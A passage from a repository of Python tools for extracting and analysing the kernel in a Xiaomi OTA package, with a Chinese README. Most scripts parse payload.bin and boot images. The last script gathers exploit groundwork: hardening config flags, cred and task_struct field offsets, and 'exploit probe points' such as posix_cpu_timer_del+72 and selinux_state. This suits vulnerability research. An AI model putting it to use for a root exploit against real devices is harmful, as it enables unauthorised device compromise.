on a matching build for structure layouts.

## Notes

- `kernel_cfg_btf.py` contains this kernel's static base address
  (`0xffffffc080000000`) and the probe-point offsets; adjust them for another
  kernel.
- The OTA itself (Xiaomi proprietary) is **not** included in this repository.
  Only hashes and derived analysis in `docs/` are.

```

`tools/README.zh-CN.md`:

```md
# tools（中文版）

> 英文原版：[`README.md`](README.md)。若两者不一致，以英文版为准并同步本文件。

用于从 OTA 中提取内核、恢复符号、校验载荷常量的辅助脚本。它们都是普通 Python 3
脚本；输入从环境变量或 argv 读取（最初是针对某一份 OTA 写的，默认值体现了这点）。

| 脚本 | 用途 |
|---|---|
| `probe_payload.py <ota.zip>` | 读取 A/B OTA 的 `payload.bin` 头和 protobuf manifest，打印分区/操作结构 |
| `extract_payload.py` | 从 OTA 提取 `boot`、`init_boot`、`vendor_boot`、`dtbo`、`vbmeta*`；逐分区校验 SHA-256 并写 `extract_summary.json`。环境/参数：`OTA_ZIP`、`OUTDIR`（`<ota.zip> [outdir]`） |
| `unpack_boot.py <boot.img>` | 解析 Android boot 镜像（v0–v4），打印头，写出 `kernel`、`ramdisk`、`second`、`dtb` |
| `check_hash.py <ota.zip>` | 研究用：确认 operation 的 `data_sha256` 覆盖的是存储（压缩后）块还是解压后数据 |
| `hash_payload.py <ota.zip> [expected_b64]` | 用 `payload_properties.txt` 的 `FILE_HASH` 校验 `payload.bin` 的 SHA-256 |
| `kernel_cfg_btf.py <kernel>` | 打印内嵌内核配置（`IKCONFIG`）、BTF 布局（`task_struct`、`cred`、`k_itimer`、`selinux_state` 等），并反汇编探针点（`begin_new_exec`、`timerqueue_del`、`rb_erase`、`selinux_inode_permission`）。需要 `pyelftools` + `capstone`（设 `PYELFTOOLS`） |

## 获取内核

```bash
python3 tools/probe_payload.py device-ota.zip
OTA_ZIP=device-ota.zip OUTDIR=out python3 tools/extract_payload.py
python3 tools/unpack_boot.py out/boot.img          # -> out/kernel
```

`out/kernel` 是原始 arm64 `Image`。要得到带符号的 ELF，用外部工具
[vmlinux-to-elf](https://github.com/clabreti/vmlinux-to-elf)
（`vmlinux-to-elf out/kernel out/vmlinux.elf`）；结构布局也可以在与该构建匹配的
环境里用 `pahole` / `bpftool btf dump` 得到。

## 注意

- `kernel_cfg_btf.py` 里内置了本内核的静态基址（`0xffffffc080000000`）与探针点
  偏移；换内核时需要调整。
- OTA 本体（小米专有）**不**包含在本仓库中；仓库只包含 `docs/` 里的哈希与派生
  分析。

`tools/check_hash.py`:

```py
#!/usr/bin/env python3
"""Check what the operation sha256 field hashes (stored blob vs decompressed)."""
import hashlib, lzma, os, struct, sys, zipfile

OTA = os.environ.get("OTA_ZIP") or (sys.argv[1] if len(sys.argv) > 1 else "")
if not OTA:
    raise SystemExit("usage: python3 check_hash.py <ota.zip>")

def rv(b, i):
    r = 0; s = 0
    while True:
        x = b[i]; i += 1
        r |= (x & 0x7f) << s; s += 7
        if not (x & 0x80):
            return r, i

def pp(buf):
    out = {}; i = 0
    while i < len(buf):
        key, i = rv(buf, i)
        fn, wt = key >> 3, key & 7
        if wt == 0:
            v, i = rv(buf, i)
        elif wt == 1:
            v = buf[i:i + 8]; i += 8
        elif wt == 2:
            ln, i = rv(buf, i); v = buf[i:i + ln]; i += ln
        elif wt == 5:
            v = buf[i:i + 4]; i += 4
        else:
            raise ValueError(wt)
        out.setdefault(fn, []).append(v)
    return out

zf = zipfile.ZipFile(OTA)
info = zf.getinfo("payload.bin")
raw = open(OTA, "rb")
raw.seek(info.header_offset)
hdr = raw.read(30)
sig, ver, flags, method, mtime, mdate, crc, csize, usize, fnlen, extralen = struct.unpack("<IHHHHHIIIHH", hdr)
data_base = info.header_offset + 30 + fnlen + extralen
raw.seek(data_base)
magic, pver, msize, mssize = struct.unpack(">4sQQI", raw.read(24))
manifest = raw.read(msize)
ops_base = data_base + 24 + msize + mssize
top = pp(manifest)

def get_ops(part):
    for pm in top[13]:
        f = pp(pm)
        if f[1][0].decode() == part:
            return f.get(8, [])
    return []

for pname, idx in [("adsp", 0), ("boot", 0), ("boot", 1), ("vendor_boot", 0)]:
    opb = get_ops(pname)[idx]
    of = pp(opb)
    t = of[1][0]; doff = of[2][0]; dlen = of[3][0]; sha = of.get(8, [b""])[0]
    raw.seek(ops_base + doff)
    blob = raw.read(dlen)
    print(f"== {pname}#{idx} type={t} doff={doff} dlen={dlen}")
    print("   store sha256:", hashlib.sha256(blob).hexdigest(), "match_sha:", hashlib.sha256(blob).digest() == sha)
    try:
        data = blob if t == 0 else lzma.decompress(blob)
        print("   decomp len:", len(data), "decomp sha256:", hashlib.sha256(data).hexdigest(), "match_sha:", hashlib.sha256(data).digest() == sha)
    except Exception as e:
        print("   decompress error:", e)
    print("   field8 sha:", sha.hex())

```

`tools/extract_payload.py`:

```py
#!/usr/bin/env python3
"""Extract selected partitions from an A/B OTA payload.bin stored in a signed OTA zip.

Wire format notes (verified against this package):
  payload header is BIG-endian: 'CrAU' + u64 version + u64 manifest_size + u32 meta_sig_size
  manifest protobuf:
    field 3 = block_size, field 13 = repeated PartitionUpdate
    PartitionUpdate: 1=name, 7=PartitionInfo(size,hash), 8=repeated InstallOperation
    InstallOperation: 1=type, 2=data_offset, 3=data_length, 4=src_extents,
                      5=src_length, 6=dst_extents, 7=dst_length, 8=data_sha256
    Extent: 1=start_block, 2=num_blocks
  InstallOperation data_offset is absolute from the start of payload.bin.
"""
import hashlib
import json
import lzma
import bz2
import os
import struct
import sys
import zipfile

OTA = os.environ.get("OTA_ZIP") or (sys.argv[1] if len(sys.argv) > 1 else "")
OUTDIR = os.environ.get("OUTDIR") or (sys.argv[2] if len(sys.argv) > 2 else "ota_extract")
if not OTA or not os.path.exists(OTA):
    raise SystemExit("usage: OTA_ZIP=<ota.zip> OUTDIR=<dir> python3 extract_payload.py  (or: script <ota.zip> [outdir])")
TARGETS = ["boot", "init_boot", "vendor_boot", "dtbo", "vbmeta", "vbmeta_system", "vbmeta_vendor"]

OP_NAMES = {0: "REPLACE", 1: "REPLACE_BZ", 6: "ZERO", 7: "DISCARD", 8: "REPLACE_XZ"}


def rv(b, i):
    r = 0; s = 0
    while True:
        x = b[i]; i += 1
        r |= (x & 0x7f) << s; s += 7
        if not (x & 0x80):
            return r, i


def parse_proto(buf):
    out = {}; i = 0; n = len(buf)
    while i < n:
        key, i = rv(buf, i)
        fn, wt = key >> 3, key & 7
        if wt == 0:
            v, i = rv(buf, i)
        elif wt == 1:
            v = buf[i:i + 8]; i += 8
        elif wt == 2:
            ln, i = rv(buf, i); v = buf[i:i + ln]; i += ln
        elif wt == 5:
            v = buf[i:i + 4]; i += 4
        else:
            raise ValueError(f"bad wire type {wt}")
        out.setdefault(fn, []).append(v)
    return out


def parse_extent(b):
    f = parse_proto(b)
    return f[1][0], f[2][0]


def zip_entry_data_offset(raw, info):
    raw.seek(info.header_offset)
    hdr = raw.read(30)
    sig, ver, flags, method, mtime, mdate, crc, csize, usize, fnlen, extralen = struct.unpack("<IHHHHHIIIHH", hdr)
    assert sig == 0x04034B50, hex(sig)
    return info.header_offset + 30 + fnlen + extralen


def main():
    os.makedirs(OUTDIR, exist_ok=True)
    zf = zipfile.ZipFile(OTA)
    info = zf.getinfo("payload.bin")
    raw = open(OTA, "rb")
    base = zip_entry_data_offset(raw, info)

    raw.seek(base)
    magic, pver, msize, mssize = struct.unpack(">4sQQI", raw.read(24))
    assert magic == b"CrAU" and pver == 2, (magic, pver)
    manifest = raw.read(msize)
    ops_base = base + 24 + msize + mssize
    print(f"[payload] version={pver} manifest={msize} metadata_sig={mssize} data_base={base} ops_base={ops_base}")

    top = parse_proto(manifest)
    block_size = top[3][0]
    parts = {}
    for pm in top[13]:
        f = parse_proto(pm)
        name = f[1][0].decode()
        npi = parse_proto(f[7][0]) if 7 in f else {}
        size = npi[1][0] if 1 in npi else 0
        nhash = npi[2][0] if 2 in npi else b""
        ops = []
        for opb in f.get(8, []):
            of = parse_proto(opb)
            op = {
                "type": of[1][0],
                "data_offset": of.get(2, [0])[0],
                "data_length": of.get(3, [0])[0],
                "dst_extents": [parse_extent(e) for e in of.get(6, [])],
                "dst_length": of.get(7, [0])[0],
                "sha256": of.get(8, [b""])[0],
            }
            ops.append(op)
        parts[name] = {"size": size, "hash": nhash, "ops": ops}

    print(f"[manifest] block_size={block_size} partitions={len(parts)}")
    summary = {}
    for name in TARGETS:
        p = parts.get(name)
        if p is None:
            print(f"[{name}] NOT IN MANIFEST")
            continue
        total = p["size"]
        outpath = os.path.join(OUTDIR, name + ".img")
        print(f"[{name}] size={total} ops={len(p['ops'])} -> {outpath}")
        written = 0
        types = {}
        with open(outpath, "wb") as out:
            out.truncate(total)
            for idx, op in enumerate(p["ops"]):
                t = op["type"]
                types[t] = types.get(t, 0) + 1
                if t in (0, 1, 8):
                    raw.seek(ops_base + op["data_offset"])
                    blob = raw.read(op["data_length"])
                    if t == 0:
                        data = blob
                    elif t == 1:
                        data = bz2.decompress(blob)
                    else:
                        data = lzma.decompress(blob)
                    if op["sha256"] and hashlib.sha256(blob).digest() != op["sha256"]:
                        raise SystemExit(f"{name} op#{idx}: data sha256 mismatch")
                    src = data
                elif t in (6, 7):
                    src = b"\x00" * (op["dst_length"] or sum(nb * block_size for _, nb in op["dst_extents"]))
                else:
                    raise SystemExit(f"{name} op#{idx}: unsupported op type {t}")
                need = sum(nb * block_size for _, nb in op["dst_extents"])
                if op["dst_length"]:
                    need = op["dst_length"]
                if len(src) < need:
                    raise SystemExit(f"{name} op#{idx}: decompressed {len(src)} < needed {need}")
                off = 0
                for start_block, num_blocks in op["dst_extents"]:
                    chunk = min(num_blocks * block_size, need - off)
                    out.seek(start_block * block_size)
                    out.write(src[off:off + chunk])
                    off += chunk
                    written += chunk
        # whole-partition hash check
        h = hashlib.sha256()
        with open(outpath, "rb") as f:
            while True:
                b = f.read(1 << 20)
                if not b:
                    break
                h.update(b)
        ok = (p["hash"] == h.digest()) if p["hash"] else None
        summary[name] = {"size": total, "ops": len(p["ops"]), "types": types,
                         "written": written, "partition_hash_ok": ok,
                         "sha256": h.hexdigest()}
        print(f"[{name}] written={written} types={types} partition_sha256_ok={ok}")
    with open(os.path.join(OUTDIR, "extract_summary.json"), "w") as f:
        json.dump(summary, f, indent=2)
    print("\nDONE")


if __name__ == "__main__":
    main()
```

`tools/hash_payload.py`:

```py
#!/usr/bin/env python3
"""Verify payload.bin SHA-256 against payload_properties FILE_HASH."""
import base64, hashlib, os, struct, sys, time, zipfile

OTA = os.environ.get("OTA_ZIP") or (sys.argv[1] if len(sys.argv) > 1 else "")
if not OTA:
    raise SystemExit("usage: python3 hash_payload.py <ota.zip> [expected_file_hash_b64]")
EXPECT = (sys.argv[2] if len(sys.argv) > 2
          else "XmVK3y/+rKnVAdfYUk3xePMkJVIaVbU8BYhv55OfudU=")

zf = zipfile.ZipFile(OTA)
info = zf.getinfo("payload.bin")
raw = open(OTA, "rb")
raw.seek(info.header_offset)
hdr = raw.read(30)
sig, ver, flags, method, mtime, mdate, crc, csize, usize, fnlen, extralen = struct.unpack("<IHHHHHIIIHH", hdr)
data_off = info.header_offset + 30 + fnlen + extralen
size = 10373757059
print(f"hashing payload.bin: offset={data_off} size={size} ({size/1e9:.2f} GB)")
raw.seek(data_off)
h = hashlib.sha256()
left = size
t0 = time.time()
step = 32 * 1024 * 1024
done = 0
while left > 0:
    b = raw.read(min(step, left))
    if not b:
        raise SystemExit("unexpected EOF")
    h.update(b)
    left -= len(b)
    done += len(b)
    if done % (1024 * 1024 * 1024) < step:
        el = time.time() - t0
        print(f"  {done/1e9:.2f} GB  {done/1e6/max(el,1e-9):.0f} MB/s", flush=True)
digest = h.digest()
ok = digest == base64.b64decode(EXPECT)
print("sha256:", digest.hex())
print("expect:", base64.b64decode(EXPECT).hex())
print("MATCH" if ok else "MISMATCH", f"({time.time()-t0:.1f}s)")

```

`tools/kernel_cfg_btf.py`:

```py
#!/usr/bin/env python3
"""Kernel config + BTF struct layout + exploit probe-point checks for the 4.0.16 kernel."""
import gzip
import os
import struct
import sys

sys.path.insert(0, os.environ.get("PYELFTOOLS",
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".toolchain", "pylib")))
from elftools.elf.elffile import ELFFile
from capstone import Cs, CS_ARCH_ARM64, CS_MODE_ARM

KERNEL = os.environ.get("KERNEL_IMAGE") or (sys.argv[1] if len(sys.argv) > 1 else "ota_extract/kernel")
if not os.path.exists(KERNEL):
    raise SystemExit("usage: KERNEL_IMAGE=<kernel Image> python3 kernel_cfg_btf.py  (or: script <kernel Image>)")
data = open(KERNEL, "rb").read()
BASE = 0xFFFFFFC080000000

# ---------- 1. embedded kernel config (IKCONFIG) ----------
print("=" * 70)
print("[1] embedded kernel config")
i = data.find(b"IKCFG_ST")
j = data.find(b"IKCFG_ED", i if i >= 0 else 0)
print("IKCFG_ST at", hex(i) if i >= 0 else "NOT FOUND", " IKCFG_ED at", hex(j) if j >= 0 else "NOT FOUND")
cfg = {}
if i >= 0 and j >= 0:
    blob = data[i + 8:j]
    try:
        text = gzip.decompress(blob).decode("utf-8", "replace")
        for line in text.splitlines():
            if line.startswith("CONFIG_") and "=" in line:
                k, v = line.split("=", 1)
                cfg[k] = v
            elif line.startswith("# CONFIG_") and line.endswith(" is not set"):
                cfg[line[2:].split(" is not set")[0]] = "n"
        print("config lines:", len(cfg))
    except Exception as ex:
        print("decompress failed:", ex)
checks = ["CONFIG_KPROBES", "CONFIG_KALLSYMS", "CONFIG_KALLSYMS_BASE_RELATIVE",
          "CONFIG_DEBUG_INFO_BTF", "CONFIG_IKCONFIG", "CONFIG_IKCONFIG_PROC",
          "CONFIG_SECURITY_SELINUX", "CONFIG_TRACING", "CONFIG_FTRACE",
          "CONFIG_BPF_SYSCALL", "CONFIG_MODULES", "CONFIG_KPROBE_EVENTS",
          "CONFIG_RANDOMIZE_BASE", "CONFIG_ARM64_VA_BITS",
          "CONFIG_HARDENED_USERCOPY", "CONFIG_CFI_CLANG",
          "CONFIG_SECURITY_SELINUX_DISABLE", "CONFIG_LSM"]
for c in checks:
    if c in cfg:
        print(f"  {c}={cfg[c]}")
    else:
        print(f"  {c}=MISSING")

# ---------- 2. BTF ----------
print()
print("=" * 70)
print("[2] BTF struct layouts")
magic = b"\x9f\xeb\x01\x00"
pos = []
start = 0
while True:
    k = data.find(magic, start)
    if k < 0 or len(pos) > 5:
        break
    pos.append(k)
    start = k + 1
print("BTF magic candidates:", [hex(p) for p in pos])

def parse_btf(off):
    magic_, ver, flags = struct.unpack_from("<HBB", data, off)
    hdr_len, type_off, type_len, str_off, str_len = struct.unpack_from("<IIIII", data, off + 4)
    base = off + hdr_len
    types = base + type_off
    strs = base + str_off
    print(f"  header: ver={ver} hdr_len={hdr_len} type_len={type_len} str_len={str_len}")
    def s(no):
        e = data.find(b"\x00", strs + no)
        return data[strs + no:e].decode("utf-8", "replace")
    kinds = {1: 4, 2: 0, 3: 12, 4: 0, 5: 0, 6: 8, 7: 0, 8: 0, 9: 0, 10: 0, 11: 0,
             12: 0, 13: 8, 14: 4, 15: 12, 16: 0, 17: 4, 18: 0, 19: 12}
    out = []
    p = types
    tid = 1
    end = types + type_len
    while p < end:
        name_off, info, size_type = struct.unpack_from("<III", data, p)
        p += 12
        kind = (info >> 24) & 0x1F
        vlen = info & 0xFFFF
        name = s(name_off)
        members = []
        if kind in (4, 5):
            for _ in range(vlen):
                m_name, m_type, m_off = struct.unpack_from("<III", data, p)
                p += 12
                members.append((s(m_name), m_type, m_off))
        else:
            p += kinds.get(kind, 0) * vlen if kind in (6, 13, 15, 19) else kinds.get(kind, 0)
        out.append((tid, name, kind, size_type, members))
        tid += 1
    return out

btf = None
for p in pos:
    try:
        t = parse_btf(p)
        if any(n == "task_struct" for (_, n, k, _, _) in t):
            btf = t
            print("  using BTF at", hex(p), "types:", len(t))
            break
    except Exception as ex:
        print("  parse at", hex(p), "failed:", ex)

def find_struct(name):
    for tid, n, kind, size, members in btf or []:
        if n == name and kind == 4:
            return tid, size, members
    return None

if btf:
    for name, wanted in [("task_struct", ["cred", "comm"]),
                         ("cred", ["usage", "uid", "gid", "suid", "sgid", "euid", "egid", "fsuid", "fsgid", "security"])]:
        r = find_struct(name)
        if not r:
            print(f"  struct {name}: NOT FOUND")
            continue
        tid, size, members = r
        print(f"  struct {name}: type_id={tid} size=0x{size:x} members={len(members)}")
        for mname, mtype, moff in members:
            if mname in wanted:
                print(f"    {mname:18s} offset=0x{moff // 8:x}")
else:
    print("  no usable BTF found")

# ---------- 3. exploit probe points ----------
print()
print("=" * 70)
print("[3] exploit probe points")
with open("ota_extract/vmlinux.elf", "rb") as f:
    e = ELFFile(f)
    syms = {}
    for sym in e.get_section_by_name(".symtab").iter_symbols():
        if sym["st_value"]:
            syms[sym.name] = sym["st_value"]

md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
md.detail = True
for sname in ["posix_cpu_timer_del", "__set_task_comm", "ksys_read", "__arm64_sys_read",
              "pskb_expand_head", "fasync", "selinux_state", "misc_list", "init_task"]:
    print(f"  {sname:24s} = {hex(syms[sname]) if sname in syms else 'MISS'}")
pdel = syms.get("posix_cpu_timer_del")
if pdel:
    off = pdel - BASE
    probe = pdel + 72
    print(f"\n  posix_cpu_timer_del+72 = 0x{probe:x}")
    code = data[off:off + 128]
    n = 0
    for ins in md.disasm(code, pdel):
        mark = "  <-- probe point" if ins.address == probe else ""
        print(f"    0x{ins.address:x}: {ins.mnemonic:8s} {ins.op_str}{mark}")
        n += 1
        if n > 14:
            break
    # is there an instruction exactly at probe?
    print("  4-byte aligned:", probe % 4 == 0)
